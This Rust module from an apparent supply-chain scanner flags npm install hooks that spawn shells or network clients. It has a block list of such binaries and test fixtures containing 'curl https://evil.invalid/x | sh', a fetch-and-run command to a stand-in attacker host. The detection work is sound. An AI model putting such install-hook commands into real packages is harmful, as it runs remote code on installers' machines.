//! `package.json` install-hook shellout detection.
//!
//! Per SPEC §ast JS/TS-specific checks, a `preinstall` / `install` /
//! `postinstall` script that spawns a shell or network client is the
//! canonical supply-chain attack shape — the hook fires on `npm install`
//! with whatever privileges the installing user has, and the command
//! string is arbitrary shell.
//!
//! This analyzer is structurally a JSON parse rather than an AST walk, so
//! it lives outside `src/ast/`. The scan orchestrator invokes it on any
//! file whose basename is literally `package.json`.

use std::path::Path;

use serde_json::Value;

use crate::finding::{redact_snippet, Finding, PassKind, Severity, SignalKind};
use crate::util::{snippet_around, LineIndex};

const HOOKS: &[&str] = &["preinstall", "install", "postinstall"];

const SHELL_BINARIES: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "curl", "wget", "python", "python3",
];

/// Analyze a `package.json` file. Returns findings; never emits a parse
/// error (malformed JSON is simply ignored, as it is not our job to lint
/// npm packaging).
pub fn analyze(path: &Path, bytes: &[u8]) -> Vec<Finding> {
    let Ok(root) = serde_json::from_slice::<Value>(bytes) else {
        return Vec::new();
    };
    let Some(scripts) = root.get("scripts").and_then(|v| v.as_object()) else {
        return Vec::new();
    };
    let index = LineIndex::new(bytes);
    let mut findings = Vec::new();
    for &hook in HOOKS {
        let Some(cmd) = scripts.get(hook).and_then(|v| v.as_str()) else {
            continue;
        };
        if !looks_like_shellout(cmd) {
            continue;
        }
        let offset = find_key_offset(bytes, hook).unwrap_or(0);
        let (line, col) = index.locate(offset);
        findings.push(Finding {
            path: path.to_path_buf(),
            byte_offset: offset,
            line,
            col,
            pass: PassKind::Ast,
            kind: SignalKind::InstallHookShellout,
            severity: Severity::Warn,
            confidence: 0.85,
            message: format!("`{}` script shells out: {}", hook, truncate(cmd, 80)),
            snippet: redact_snippet(&snippet_around(bytes, offset, 120)),
            diff_introduced: false,
        });
    }
    findings
}

/// Heuristic: does this command string spawn a shell or network client?
/// Splits on common shell metacharacters (`;`, `&&`, `||`, `|`, `&`), strips
/// any path prefix from each token, and checks whether the first word of
/// any clause matches a known shell or network binary.
fn looks_like_shellout(cmd: &str) -> bool {
    let normalized = cmd
        .replace("&&", " ")
        .replace("||", " ")
        .replace(['|', ';', '&'], " ");
    for clause in normalized.split_whitespace() {
        let bare = clause.rsplit_once('/').map(|(_, b)| b).unwrap_or(clause);
        if SHELL_BINARIES.contains(&bare) {
            return true;
        }
    }
    false
}

/// Find the byte offset of a top-level `"hook"` key within the raw bytes so
/// the finding points at the offending line. Approximate — matches the
/// first `"<hook>"` literal which for typical package.json is the script
/// entry.
fn find_key_offset(bytes: &[u8], hook: &str) -> Option<usize> {
    let needle = format!("\"{}\"", hook);
    bytes
        .windows(needle.len())
        .position(|w| w == needle.as_bytes())
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        return s.to_string();
    }
    let mut end = max;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &s[..end])
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn run(src: &[u8]) -> Vec<Finding> {
        analyze(&PathBuf::from("package.json"), src)
    }

    #[test]
    fn postinstall_curl_pipe_sh_is_warn() {
        let pkg = br#"{
            "name": "evil",
            "scripts": {
                "postinstall": "curl https://evil.invalid/x | sh"
            }
        }"#;
        let f = run(pkg);
        let hit = f
            .iter()
            .find(|x| x.kind == SignalKind::InstallHookShellout)
            .expect("expected InstallHookShellout");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn preinstall_bash_is_warn() {
        let pkg = br#"{
            "scripts": { "preinstall": "bash ./setup.sh" }
        }"#;
        assert!(run(pkg)
            .iter()
            .any(|f| f.kind == SignalKind::InstallHookShellout));
    }

    #[test]
    fn postinstall_node_script_is_ignored() {
        // Running a node script as a postinstall is ordinary.
        let pkg = br#"{
            "scripts": { "postinstall": "node ./scripts/build.js" }
        }"#;
        assert!(run(pkg).is_empty());
    }

    #[test]
    fn postinstall_npm_run_is_ignored() {
        let pkg = br#"{
            "scripts": { "postinstall": "npm run build && echo done" }
        }"#;
        assert!(run(pkg).is_empty());
    }

    #[test]
    fn no_scripts_section_is_ignored() {
        let pkg = br#"{ "name": "x", "version": "1.0.0" }"#;
        assert!(run(pkg).is_empty());
    }

    #[test]
    fn malformed_json_is_ignored() {
        let pkg = br#"{ not json "#;
        assert!(run(pkg).is_empty());
    }

    #[test]
    fn wget_absolute_path_is_warn() {
        let pkg = br#"{
            "scripts": { "install": "/usr/bin/wget http://x" }
        }"#;
        assert!(run(pkg)
            .iter()
            .any(|f| f.kind == SignalKind::InstallHookShellout));
    }

    #[test]
    fn non_hook_script_is_ignored() {
        // `test` and `start` aren't install hooks. Even if they shell out, we
        // don't flag them — they run on developer action, not on install.
        let pkg = br#"{
            "scripts": { "test": "curl x | sh" }
        }"#;
        assert!(run(pkg).is_empty());
    }
}
